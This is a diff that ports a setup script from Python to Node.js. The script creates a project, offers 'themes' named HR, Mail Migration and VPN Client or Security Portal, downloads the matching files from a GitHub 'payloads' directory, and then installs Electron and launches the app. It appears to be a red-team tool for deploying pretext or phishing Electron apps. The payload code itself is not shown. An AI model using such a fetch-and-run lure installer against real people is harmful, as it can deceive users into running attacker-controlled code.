@@ -1,58 +1,72 @@
-import subprocess
-import json
-import os
+const fs = require('fs');
+const https = require('https');
+const { execSync } = require('child_process');
+const prompt = require('prompt-sync')();
 
-def main():
-    install_folder_input = input("What is the folder name?\n").strip()
-    subprocess.run(["mkdir", install_folder_input])
-    path = subprocess.run(["pwd"], capture_output=True, text=True).stdout.strip()
-    new_path = os.path.join(path, install_folder_input)
-    os.chdir(new_path)
-    print(f"Folder created. Trying to install into: {os.getcwd()}\n")
+async function main() {
+    const installFolderInput = prompt('What is the folder name?\n').trim();
+    fs.mkdirSync(installFolderInput, { recursive: true });
+    process.chdir(installFolderInput);
+    console.log(`Folder created. Trying to install into: ${process.cwd()}\n`);
 
-    try:
-        subprocess.run(['npm', 'init', '-y'], check=True, text=True, capture_output=True)
-        print('npm init completed successfully.\n')
-    except subprocess.CalledProcessError as error:
-        print('Error running npm init:', error)
-    
-    display_menu()
+    try {
+        execSync('npm init -y', { stdio: 'inherit' });
+        console.log('npm init completed successfully.\n');
+        const choice = prompt('Which theme? 1) HR 2) Mail Migration 3) VPN Client').trim();
+        await handleChoice(choice);
+    } catch (error) {
+        console.error('Error:', error);
+    }
+}
 
-def display_menu():
-    print("Select the theme:")
-    print("1. HR Copy")
-    print("2. Mail Migration Client")
-    print("3. Security Portal")
+async function downloadFile(url, filename) {
+    return new Promise((resolve, reject) => {
+        const file = fs.createWriteStream(filename);
+        https.get(url, (response) => {
+            response.pipe(file);
+            file.on('finish', () => {
+                file.close(resolve);
+                console.log(`${filename} downloaded.`);
+            });
+        }).on('error', (error) => {
+            fs.unlink(filename, () => {
+                reject(error);
+            });
+        });
+    });
+}
 
-    choice = input("Enter your choice: ")
-    handle_choice(choice)
+async function handleChoice(choice) {
+    if (choice === '1' || choice === '2' || choice === '3') {
+        await downloadThemes(choice);
+        console.log('Theme downloaded. Continuing to the next step\n');
+        updatePackageJson();
+    } else {
+        console.log('Invalid choice. Please enter a valid option.');
+        await main();
+    }
+}
 
-def handle_choice(choice):
-    if choice == '1':
-        subprocess.run(["wget", "https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/migration/index.js"], check=True)
-        subprocess.run(["wget", "https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/migration/index.html"], check=True)
-        print("Theme downloaded. Continuing to the next step\n")
-        update_package_json()
-    elif choice == '2':
-        subprocess.run(["wget", "https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/migration/index.js"], check=True)
-        print("Theme downloaded. Continuing to the next step\n")
-        update_package_json()
-    elif choice == '3':
-        subprocess.run(["wget", "https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/index.html"], check=True)
-        subprocess.run(["wget", "https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/styles.css"], check=True)
-        subprocess.run(["wget", "https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/index.js"], check=True)
-        print("Theme downloaded. Continuing to the next step\n")
-        update_package_json()
-    else:
-        print("Invalid choice. Please enter a valid option.")
-        display_menu()
+async function downloadThemes(choice) {
+console.log("Make a choice from these options");
+    if (choice === '1' || choice === '2') {
+        await Promise.all([
+            downloadFile('https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/migration/index.js', 'index.js'),
+            choice === '1' ? downloadFile('https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/migration/index.html', 'index.html') : Promise.resolve(),
+        ]);
+    } else if (choice === '3') {
+        await Promise.all([
+            downloadFile('https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/index.html', 'index.html'),
+            downloadFile('https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/styles.css', 'styles.css'),
+            downloadFile('https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/index.js', 'index.js'),
+        ]);
+    }
+}
 
-
-def update_package_json():
-    try:
-        if not os.path.exists('package.json'):
-            # Create a basic package.json if it doesn't exist
-            basic_package_json = {
+function updatePackageJson() {
+    try {
+        if (!fs.existsSync('package.json')) {
+            const basicPackageJson = {
                 "name": "your-app-name",
                 "version": "1.0.0",
                 "description": "Your app description",
@@ -62,50 +76,47 @@ def update_package_json():
                 },
                 "author": "Your Name",
                 "license": "MIT"
-            }
-            with open('package.json', 'w') as file:
-                json.dump(basic_package_json, file, indent=2)
-                print('Created a basic package.json file.\n')
+            };
+            fs.writeFileSync('package.json', JSON.stringify(basicPackageJson, null, 2));
+            console.log('Created a basic package.json file.\n');
+        }
 
-        with open('package.json', 'r+') as file:
-            content = file.read().strip()
-            if not content:
-                # If the file is empty, write the basic structure
-                basic_package_json = {
-                    "name": "your-app-name",
-                    "version": "1.0.0",
-                    "description": "Your app description",
-                    "main": "index.js",
-                    "scripts": {
-                        "start": "electron ."
-                    },
-                    "author": "Your Name",
-                    "license": "MIT"
-                }
-                json.dump(basic_package_json, file, indent=2)
-                print('Filled an empty package.json file with a basic structure.\n')
-            else:
-                package_json = json.loads(content)
-                package_json['scripts']['start'] = 'electron .'
-                file.seek(0)
-                json.dump(package_json, file, indent=2)
-                file.truncate()
+        let content = fs.readFileSync('package.json', 'utf8').trim();
+        if (!content) {
+            const basicPackageJson = {
+                "name": "your-app-name",
+                "version": "1.0.0",
+                "description": "Your app description",
+                "main": "index.js",
+                "scripts": {
+                    "start": "electron ."
+                },
+                "author": "Your Name",
+                "license": "MIT"
+            };
+            fs.writeFileSync('package.json', JSON.stringify(basicPackageJson, null, 2));
+            console.log('Filled an empty package.json file with a basic structure.\n');
+        } else {
+            let packageJson = JSON.parse(content);
+            packageJson.scripts.start = 'electron .';
+            fs.writeFileSync('package.json', JSON.stringify(packageJson, null, 2));
+        }
 
-        print('package.json updated successfully.\n')
-        print('Attempting Electron install..\n')
-        install_electron()
-    except (IOError, json.JSONDecodeError) as error:
-        print('Error reading/writing package.json:', error)
+        console.log('package.json updated successfully.\n');
+        console.log('Attempting Electron install..\n');
+        installElectron();
+    } catch (error) {
+        console.error('Error reading/writing package.json:', error);
+    }
+}
 
+function installElectron() {
+    try {
+        execSync('npm install electron --save-dev', { stdio: 'inherit' });
+        execSync('npm run start', { stdio: 'inherit' });
+    } catch (error) {
+        console.error('Error installing/running Electron:', error);
+    }
+}
 
-
-def install_electron():
-    try:
-        subprocess.run(['npm', 'install', 'electron', '--save-dev'], check=True)
-        print('Electron installed successfully.\n')
-        subprocess.run(['npm', 'run', 'start'], check=True)
-    except subprocess.CalledProcessError as error:
-        print('Error installing/running Electron:', error)
-
-if __name__ == "__main__":
-    main()
+main();
